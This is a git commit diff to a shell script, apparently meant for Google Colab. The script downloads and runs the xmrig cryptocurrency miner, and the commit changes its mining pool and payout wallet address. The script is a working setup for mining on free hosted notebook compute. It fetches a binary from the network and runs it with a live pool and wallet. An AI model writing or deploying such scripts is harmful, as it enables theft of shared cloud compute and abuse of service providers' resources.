899dfd1f3e76b6494a09401387bebc82c48bfb11
umerzohaib1 <102261070+umerzohaib1@users.noreply.github.com>
2022-05-07 16:22:00 +0500

    Update gcolab-us.sh

--- gcolab-us.sh
+++ gcolab-us.sh
@@ -10,4 +10,4 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
 tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
 cd xmrig-6.16.4
-./xmrig -a ghostrider --url stratum-asia.rplant.xyz:7075 --user BkNVb9DDmkCXcahdNcmfd31FgeXSUed7pq
+./xmrig -a ghostrider -o stratum+tcp://ghostrider.asia.mine.zergpool.com:5354 -u TE26PVpeNjmPcK6vxAua9mmpLME6hPq8Vy -p  c=TRX,mc=BTRM,ID=W1
